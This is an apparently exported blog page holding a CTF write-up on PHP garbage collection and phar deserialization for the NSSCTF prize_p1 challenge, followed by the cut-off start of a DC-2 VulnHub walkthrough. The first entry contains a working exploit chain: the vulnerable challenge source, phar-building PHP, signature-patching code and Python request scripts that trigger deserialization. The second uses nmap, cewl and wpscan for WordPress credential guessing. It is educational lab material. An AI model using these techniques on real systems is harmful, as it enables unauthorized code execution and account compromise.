src="https://img-blog.csdnimg.cn/22e913ea4a704047b26b0700fbfbafba.png" alt="1"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>phpphp.ini<code>zend.enable_gc</code>phpgc_enable()  gc_disable()</p><p><img src="https://img-blog.csdnimg.cn/612b08fded7346268103c89b188ad14a.png" alt=""></p><p> refcount <strong></strong> refcount    <strong> 0</strong> zval  refcount  1    zval  refcount  0 </p><h2 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h2><p>GCctfPHP<code>__destruct()</code><code>__destruct()</code></p><p></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">czy</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$test</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">.</span><span class="token string double-quoted-string">"__construct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">.</span><span class="token string double-quoted-string">"__destruct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//new</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//__destruct();</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/96d1a112806f4e149dede4669e5697b4.png" alt=""></p><p>1<code>__destrcut()</code>12</p><p></p><p></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">czy</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$test</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">.</span><span class="token string double-quoted-string">"__construct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">.</span><span class="token string double-quoted-string">"__destruct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/10a042c5408c40bdb0b228566880b9f3.png" alt=""><br> czynew4new czy(1)NULL<code>__destruct()</code><code>__destruct()</code></p><p><code>$c[0]=$c[1];//</code><br> <img src="https://img-blog.csdnimg.cn/f4192d1071814468b09e4daffcbf8377.png" alt=""></p><p></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><strong>NSSCTF prize_p1</strong><a href="https://www.ctfer.vip/problem/14"></a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>META</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">getflag</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$config</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./tmp/a.txt"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//GC</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./tmp/a.txt"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span>pharphar<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">></span><span class="token punctuation">(</span>file_put_contents<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">2</span><span class="token operator">></span>phar<span class="token punctuation">(</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;tmp&#x2F;a.txt<strong>phar</strong>&#x2F;tmp&#x2F;a.txt<code>destruct()</code>flag<code>throw new Error()</code>GC<code>__destruct()</code></p><h3 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h3><p>pharphp.iniphar.readonlyOffphar()<br> <img src="https://img-blog.csdnimg.cn/c2c224439fdc4c3ea5931ff326460616.png" alt=""></p><p>phar</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">getflag</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"123.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xxx"</span><span class="token operator">.</span><span class="token string double-quoted-string">"xxx&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//stub</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//meta-datamanifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//</span><span class="token comment">//</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>phar</p><blockquote><ol><li>a stub</li></ol><p>stub**<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>**<code>__HALT_COMPILER();?&gt;</code>pharphar</p><p>2.a manifest describing the contents</p><p>PharMeta-data()phar:&#x2F;&#x2F;pharpharMeta-data</p><p>3. the file contents </p><p></p><p>4.signature </p><p>phar</p></blockquote><p>phar</p><p>phar&#x3D;+4+4GBMB</p><p><img src="https://img-blog.csdnimg.cn/21937b33f24b4b75951b683dd0bfadb9.png" alt=""></p><p>02 00 00 00sha1<a href="https://www.php.net/manual/zh/phar.fileformat.signature.php"></a><br> <img src="https://img-blog.csdnimg.cn/745c261c5195453fa2060be5ee60029e.png" alt=""></p><p>phar</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">getflag</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"czy.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        <span class="token comment">//phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                             <span class="token comment">//</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">//phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setmetadata</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">=></span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">=></span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$a,nullserialize</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"czy.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"czy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                           <span class="token comment">//phar+</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                              <span class="token comment">//</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"phar"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>NULLGCGC</p><p>okczy.pharmetadata</p><p><img src="https://img-blog.csdnimg.cn/2771c6ad047944e2b91e0608e09d73b9.png" alt=""></p><p>0getflag<code>&#123;&#125;i</code>1null10<code>null</code>GC<code>0:&#123;&#125;i:1;N;</code><code>0:&#123;&#125;i:0;N;</code>phar1628GBMB21-24sha11-20</p><p></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha1 <span class="token comment">#sha1</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"czy.phar"</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>   text<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   main<span class="token operator">=</span>text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">]</span>        <span class="token comment">#(28)</span>   end<span class="token operator">=</span>text<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span>   new_sign<span class="token operator">=</span>sha1<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>   new_phar<span class="token operator">=</span>main<span class="token operator">+</span>new_sign<span class="token operator">+</span>end   <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"czy.phar"</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>new_phar<span class="token punctuation">)</span>     <span class="token comment">#phar</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1-20sha1phargetflag<strong></strong>czy.phar<strong></strong>getflag</p><p></p><p></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> reurl<span class="token operator">=</span><span class="token string">"http://node4.anna.nssctf.cn:28513/"</span><span class="token comment">### phar</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"czy.phar"</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    data1<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'0[]'</span><span class="token punctuation">:</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>                                    <span class="token comment">#waf</span>    param1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'O:1:"A":1:&#123;s:6:"config";s:1:"w";&#125;'</span><span class="token punctuation">&#125;</span>    p1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>param1<span class="token punctuation">,</span>data<span class="token operator">=</span>data1<span class="token punctuation">)</span>    <span class="token comment">#print(p1.text)</span><span class="token comment">### phar</span>param2<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token string">'O:1:"A":1:&#123;s:6:"config";s:1:"r";&#125;'</span><span class="token punctuation">&#125;</span>data2<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token string">"phar://tmp/a.txt"</span><span class="token punctuation">&#125;</span>p2<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>param2<span class="token punctuation">,</span>data<span class="token operator">=</span>data2<span class="token punctuation">)</span>p2<span class="token punctuation">.</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span>flag<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'NSSCTF\&#123;.*?\&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span>p2<span class="token punctuation">.</span>text<span class="token punctuation">)</span>  <span class="token comment">#postresponse.textNSSCTF&#123;xxxxxx&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><p>czy.phar</p><p><img src="https://img-blog.csdnimg.cn/a43894200dcf4af8a31e75a1a9ad2ccf.png" alt=""></p><p></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://node4.anna.nssctf.cn:28513/'</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>    url<span class="token punctuation">,</span>    params<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'O:1:"A":1:&#123;s:6:"config";s:1:"w";&#125;'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'czy.phar.gz'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>    url<span class="token punctuation">,</span>    params<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'O:1:"A":1:&#123;s:6:"config";s:1:"r";&#125;'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'phar://tmp/a.txt'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>res<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/95dfa9dfc043429a91753966aae7dffa.png" alt="2"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><a href="http://arsenetang.com/2021/11/28/%E6%B5%85%E6%9E%90GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#GC%E5%9C%A8phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E5%AE%9E%E9%99%85%E8%BF%90%E7%94%A8">1</a></p><p><a href="http://xilzy666.gitee.io/xilzy/2022/03/05/nss-prize1-2/">2</a></p><p><a href="https://blog.csdn.net/qq_51295677/article/details/123520193?ydreferer=aHR0cHM6Ly93d3cuYmluZy5jb20v">3</a></p><p><a href="https://www.php.net/manual/zh/features.gc.php">4</a></p><p><a href="https://blog.csdn.net/qq_53460654/article/details/121889104?ydreferer=aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzNDYwNjU0L2FydGljbGUvZGV0YWlscy8xMjE4ODkxMDQ=">5</a></p><p><a href="https://blog.csdn.net/weixin_53090346/article/details/127598455?ydreferer=aHR0cHM6Ly93d3cuYmluZy5jb20v">6</a></p>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-2</title>
      <link href="/2023/07/09/DC-2%E6%89%93%E9%9D%B6%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/07/09/DC-2%E6%89%93%E9%9D%B6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><blockquote><p>kali<br>dc-2<br>windows11()</p></blockquote><p><a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a><br>VMNAT<br><img src="https://img-blog.csdnimg.cn/3a2cf2a875e2404a8b5653dde6445ccc.png" alt="1"></p><p></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><strong></strong><br>nmap<code>nmap 192.168.206.136/24</code><br>dc-2192.168.206.136<br><img src="https://img-blog.csdnimg.cn/4a9b341fd14d4e7587ad30fc6bbbf3fb.png" alt="2"><br><strong></strong></p><p><code>nmap -sV -p- 192.168.206.136</code></p><blockquote><p>-sV:<br>-p-: </p></blockquote><p><img src="https://img-blog.csdnimg.cn/9129aeec46a7400e91881908ff120fa4.png" alt="3"><br>192.168.206.136<br><code>Did not follow redirect to http://dc-2/</code><a href="http://dc-2/%EF%BC%8C%E7%94%B1%E4%BA%8E%E6%88%91%E6%89%93%E9%9D%B6%E7%9A%84%E6%97%B6%E5%80%99%E4%BD%BF%E7%94%A8%E6%9C%AC%E6%9C%BA%E8%BF%9B%E8%A1%8C%E7%9A%84%EF%BC%8C%E5%90%8C%E6%97%B6%E4%BC%9A%E4%BD%BF%E7%94%A8kali%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%EF%BC%8C%E9%82%A3%E4%B9%88%E9%9C%80%E8%A6%81%E5%B0%86kali%E7%9A%84hosts%E6%96%87%E4%BB%B6%EF%BC%88/etc/hosts%EF%BC%89%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%B8%8B%E6%9C%AC%E5%9C%B0DNS%E8%A7%A3%E6%9E%90%E3%80%82">http://dc-2/kalikalihosts/etc/hostsDNS</a></p><p><img src="https://img-blog.csdnimg.cn/af1bd1db85754fda8912593927733dcf.png" alt="3"><br><strong>windows</strong>host<code>&quot;C:\Windows\System32\drivers\etc\hosts&quot;</code><br>kali<code>whatweb</code><br><img src="https://img-blog.csdnimg.cn/03fd35a8fd4948e890abcd0db30f9bf3.png" alt="2"><br>wordpress<br>flag1<br><img src="https://img-blog.csdnimg.cn/0fc407bd818c4d52a034bf10a1cefb37.png" alt="6"></p><blockquote><p> 1<br> cewl <br><br><br></p></blockquote><p>cewl</p><blockquote><p>cewl custom wordlist<br>cewl  Custom Word List generatorRuby<br><br>cewl </p></blockquote><p>cewl<br><code>cewl url -w </code>wpscan<strong>adminjerrytom</strong>cewljerrytomjerryflag2<br><img src="https://img-blog.csdnimg.cn/3381eac70aea4ae0841ad1cec1a30318.png" alt="2"></p><blockquote><p> WordPress <br></p></blockquote><p>ssh7744ssh<br></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>nmap</p><blockquote><p>nmap -A -p- 192.168.206.136 </p></blockquote><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p><strong>hosts</strong><br>windowsC:\Windows\System32\drivers\etc\hosts<br>linux&#x2F;etc&#x2F;hosts</p><h3 id="cewl"><a href="#cewl" 